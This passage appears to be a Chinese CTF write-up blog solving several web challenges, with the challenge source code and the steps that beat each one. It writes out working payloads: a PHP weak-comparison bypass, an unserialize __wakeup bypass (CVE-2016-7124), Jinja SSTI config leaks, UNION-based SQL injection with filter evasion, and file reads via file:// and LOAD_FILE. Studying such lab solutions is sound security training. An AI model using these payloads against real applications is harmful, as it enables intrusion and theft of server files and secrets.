<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2022</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>用c&#x3D;{“m”:”2222c”}绕过，</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>c&#x3D;{“m”:”2222c”,”n”:[[1],0]}</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>默认的第三个flase参数导致了弱类型比较漏洞。当我们的$c[“n”]&#x3D;0的时候(或者null)，会将前面要查找的字符串自动转化为0然后进行比较。<br>绕过手法<strong>c&#x3D;{“m”:”2222c”,”n”:[[],0]}</strong><br>payload：<code>http://61.147.171.105:54356?a=9e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;2222c&quot;,&quot;n&quot;:[[0],0]&#125;</code></p>
<p><img src="https://img-blog.csdnimg.cn/4707ba60885b4bab8b4c6a5e663060b4.png" alt="3"></p>
<h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p><img src="https://img-blog.csdnimg.cn/e550b56fa030492b9f805746e000103b.png" alt="1"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
            <span class="token comment">//the secret is in the fl4g.php</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span> 
        <span class="token punctuation">&#125;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> 
    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> 
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>由代码可知，flag文件很有可能在fl4g.php里。<br>分析一下代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
            <span class="token comment">//the secret is in the fl4g.php</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span> 
        <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这段代码会将我们要找的文件替换为index.php。<br>本题的php版本为<strong>PHP&#x2F;5.3.10-1</strong>，可以使用<strong>cve漏洞</strong>绕过_wakeup()。</p>
<blockquote>
<p>CVE-2016-7124(绕过__wakeup)<br>漏洞影响版本：<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p>
</blockquote>
<blockquote>
<p>漏洞产生原因：<br>如果存在__wakeup方法，调用 unserilize() 方法前则先调用__wakeup方法，但是序列化字符串中表示对象属性个数的值大于 真实的属性个数时会跳过__wakeup的执行 </p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>绕过正则表达式，首先解释一下<code>&#39;/[oc]:\d+:/i&#39;</code>，<code>[oc]</code>：匹配到o或c，<code>\d</code>：整型数。也就是匹配到类似**O:2:<strong>的会输出</strong>stop hacking!<strong>如何绕过呢？我们把</strong>O:2:<strong>改成</strong>O:+2:**不就行了？<br>具体代码：</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> 
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
            <span class="token comment">//the secret is in the fl4g.php</span>
            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span> 
        <span class="token punctuation">&#125;</span> 
    <span class="token punctuation">&#125;</span> 
<span class="token punctuation">&#125;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">x</span><span class="token punctuation">&#123;</span>
	<span class="token keyword">private</span> <span class="token variable">$file</span><span class="token operator">=</span><span class="token string single-quoted-string">'fl4g.php'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Demo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'fl4g.php'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'O:4:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'O:+4:'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//绕过正则表达式</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token variable">$a</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">':1:'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">':2:'</span><span class="token punctuation">,</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//绕过_wakeup()函数</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><em><em>$file 是私有成员序列化之后字符串首尾会多出两个空格 “%00</em>%00”，所以base64加密最好在代码中执行防止复制漏掉</em>*<br>运行之后得到<br><img src="https://img-blog.csdnimg.cn/4f6b3bfcae2a4126ae4efcdb8ec73965.png" alt="2"><br>get传参得到flag。<br><img src="https://img-blog.csdnimg.cn/6a5689494cef49759c2f6d74d441bd2f.png" alt="3"><br>这个题很有学习价值！！！</p>
<h2 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h2><p><img src="https://img-blog.csdnimg.cn/183c9b29277e4ee497d4f342aad251b0.png" alt="4"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$miwen</span><span class="token operator">=</span><span class="token string double-quoted-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span><span class="token punctuation">;</span>

<span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$_o</span><span class="token operator">=</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// echo $_o;</span>
        
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$_0</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_o</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
       
        <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_o</span><span class="token punctuation">,</span><span class="token variable">$_0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$__</span><span class="token operator">=</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$_c</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token operator">.</span><span class="token variable">$_c</span><span class="token punctuation">;</span>   
    <span class="token punctuation">&#125;</span> 
    <span class="token keyword">return</span> <span class="token function">str_rot13</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*
   逆向加密算法，解密$miwen就是flag
*/</span>
<span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>第一次遇到，记录一下。<br>我们只需要逆向解密即可。</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string double-quoted-string">"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws"</span><span class="token punctuation">;</span>
<span class="token variable">$_</span><span class="token operator">=</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">strrev</span><span class="token punctuation">(</span><span class="token function">str_rot13</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$_o</span><span class="token operator">=</span><span class="token constant">NULL</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$_0</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_0</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
       
        <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">,</span><span class="token variable">$_0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$__</span><span class="token operator">=</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$_c</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
        <span class="token variable">$_c</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$_o</span><span class="token operator">.</span><span class="token variable">$_c</span><span class="token punctuation">;</span>   
    <span class="token punctuation">&#125;</span> 
<span class="token keyword">echo</span> <span class="token function">strrev</span><span class="token punctuation">(</span><span class="token variable">$_o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>得到flag。</p>
<h2 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h2><p><img src="https://img-blog.csdnimg.cn/523623501a0d4d65b734a05f6fae1ba2.png" alt="2"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> flask
<span class="token keyword">import</span> os

app <span class="token operator">=</span> flask<span class="token punctuation">.</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

app<span class="token punctuation">.</span>config<span class="token punctuation">[</span><span class="token string">'FLAG'</span><span class="token punctuation">]</span> <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token string">'FLAG'</span><span class="token punctuation">)</span><span class="token operator">//</span>注册了一个FLAG的config，如果没有过滤的话就直接<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>config<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/shrine/&lt;path:shrine>'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">shrine</span><span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">:</span>

    <span class="token keyword">def</span> <span class="token function">safe_jinja</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
        blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'self'</span><span class="token punctuation">]</span>
        <span class="token keyword">return</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'&#123;&#123;% set &#123;&#125;=None%&#125;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">for</span> c <span class="token keyword">in</span> blacklist<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> s

    <span class="token keyword">return</span> flask<span class="token punctuation">.</span>render_template_string<span class="token punctuation">(</span>safe_jinja<span class="token punctuation">(</span>shrine<span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>ssti模板注入，是pythonFlask框架。看到<br><code>@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)</code>访问路径<code>http://61.147.171.105:64429/shrine/%7B%7B8*8%7D%7D</code>存在ssti模板注入漏洞。<br><code>safe_jinja</code>函数对**(，)，config，self**进行过滤。<br><img src="https://img-blog.csdnimg.cn/45c0d3fbef914c998da7b8cc9faac0f5.png" alt="1">查看一下app下的config。</p>
<p>文章中了解到：<br><strong>get_flashed_messages函数</strong>：<code>&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;</code><br><strong>url_for函数</strong>：<code>&#123;&#123;url_for.__globals__['current_app'].config&#125;&#125;</code><br><img src="https://img-blog.csdnimg.cn/4609f4f593f249f3b6aabc5fa7cc213c.png" alt="2"><br>得到flag。</p>
<h2 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h2><p>非常具有学习价值</p>
<p><img src="https://img-blog.csdnimg.cn/b9a7ec91e3214f8bb606a267bb14632b.png" alt="1"><br>注册一个账号登陆。<br><img src="https://img-blog.csdnimg.cn/f02e85228c7740f685c0fc3952ff3d11.png" alt="2"><br><code>?no=1 and 1=1</code>正常回显，<code>?no=1 and 1=2</code>报错。存在SQL注入。<br><code>?no=1 order by 5</code>报错<br><img src="https://img-blog.csdnimg.cn/2b8f182925864af49d2e3b146c651a8c.png" alt="3"><br>开始爆破。<br>发现加载<code>?no=1 union select 1,2,3,4</code>出现<br><img src="https://img-blog.csdnimg.cn/1d4d6d53e1444e8c80cc361073c38eda.png" alt="1"><br>肯定有东西被过滤了。测试发现输入<code>-1/**/union/**/select/**/1,2,3,4</code>正常。<code>++可以代替/**/</code><br><img src="https://img-blog.csdnimg.cn/d6f1a1faeadb4b2ba8d126ca9b202e75.png" alt="4"><br>存在反序列化，发现2处可以回显。继续测试<br><code>?no=-1/**/union/**/select/**/1,table_name,3,4 from INFORMATION_SCHEMA.TABLES -- -</code><br><code>?no=-1/**/union/**/select/**/1,group_concat(column_name),3,4 from INFORMATION_SCHEMA.columns where table_name=&quot;users&quot; -- -</code><br><img src="https://img-blog.csdnimg.cn/757a55887b714a0d9f8e953453f4c150.png" alt="2"><br>存在反序列化。</p>
<blockquote>
<p>O:8:”UserInfo”:3:{s:4:”name”;s:3:”rgg”;s:3:”age”;i:48;s:4:”blog”;s:7:”123.com”;}</p>
</blockquote>
<p>后面真是不会了。了解一下师傅们的文章。<br><strong>法一</strong><br>采用构造file协议去读取&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php的内容（file协议主要用于访问计算机本地文件，基本格式为：file:&#x2F;&#x2F;&#x2F;文件路径</p>
<blockquote>
<p>-1 &#x2F;<strong>&#x2F;union &#x2F;</strong>&#x2F; select 1,2 ,3,’O:8:”UserInfo”:3:{s:4:”name”;s:1:”1”;s:3:”age”;i:18;s:4:”blog”;s:29:”file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php”;}’#</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/b4cdabced702488fad045fa3a4349ad6.png" alt="2"></p>
<p><strong>法二</strong><br> 在MySQL中，LOAD_FILE()函数读取一个文件并将其内容作为字符串返回。</p>
<blockquote>
<p>-1 &#x2F;<strong>&#x2F;union &#x2F;</strong>&#x2F; select 1,load_file(‘&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php’) ,3,4#</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/1dbe5ddda5414ef98dbf713cc9269ad9.png" alt="3"></p>
<h2 id="Cat"><a href="#Cat" class="headerlink" title="Cat"></a>Cat</h2><p><img src="https://img-blog.csdnimg.cn/ed1db60906fd457e9bfd3bc7dbf9f8e8.png" alt="1"><br>一道非常无厘头的题<br>一打开靶场以为原来做过类似的题。就直接<strong>127.0.0.1|ls</strong>，看来是大意了。<br><img src="https://img-blog.csdnimg.cn/98ece7b60e704191a326c30e875fef28.png" alt="2"><br>爆破一下看看过滤了什么<br><img src="https://img-blog.csdnimg.cn/ee2d13cafd3e41e0b42b1104dde8b11c.png" alt="2"></p>
<p><img src="https://img-blog.csdnimg.cn/051cc20d945a4c9c8eba5da238368110.png" alt="3">453的没有过滤。<br><img src="https://img-blog.csdnimg.cn/0b317f3b22524f75a9c568a3801c5d6d.png" alt="5"></p>
<p>对@进行url编码%40，还是没用。<br>试试宽字符%EF<br>得到内容。保存为html文件。<br><img src="https://img-blog.csdnimg.cn/6e906ca935e44e08985578b99ca60031.png" alt="2"><br><img src="https://img-blog.csdnimg.cn/6ef3195b6ae148e09b3132416f430317.png" alt="5"><br>查资料后原来是django报错，仔细看文档发现绝对路径，找一下发现数据库绝对路径</p>
<blockquote>
<p>&#x2F;opt&#x2F;api&#x2F;database.sqlite3 php的curl+@绝对路径文件名</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/2c33bda622c940e0bc0f67609368b994.png" alt="5"><br>宽字节+&#x2F;opt&#x2F;api&#x2F;database.sqlite3报错出内容，查找得到flag。<br><img src="https://img-blog.csdnimg.cn/546cdd2af98047b481d0122cc007eb32.png" alt="5"></p>
<h2 id="泰山杯-简单的文件包含"><a href="#泰山杯-简单的文件包含" class="headerlink" title="泰山杯-简单的文件包含"></a>泰山杯-简单的文件包含</h2><p><img src="https://img-blog.csdnimg.cn/b1427ceb81ee46f5bff6a37e6500cc57.png" alt="1"></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
